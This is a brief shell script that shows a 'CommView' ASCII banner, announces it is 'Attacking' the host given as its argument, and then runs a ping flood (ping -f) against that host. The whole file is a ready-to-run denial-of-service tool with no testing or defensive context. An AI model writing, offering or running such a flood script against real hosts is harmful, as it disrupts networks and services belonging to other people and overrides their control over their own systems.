#!/bin/sh

echo "Starting"
cat <<EOF
  ____                       __     ___
 / ___|___  _ __ ___  _ __ __\ \   / (_) _____      __
| |   / _ \| '_ \` _ \| '_ \` _ \ \ / /| |/ _ \ \ /\ / /
| |__| (_) | | | | | | | | | | \ V / | |  __/\ V  V /
 \____\___/|_| |_| |_|_| |_| |_|\_/  |_|\___| \_/\_/

EOF

echo "Attacking $1..."

ping -f "$1"
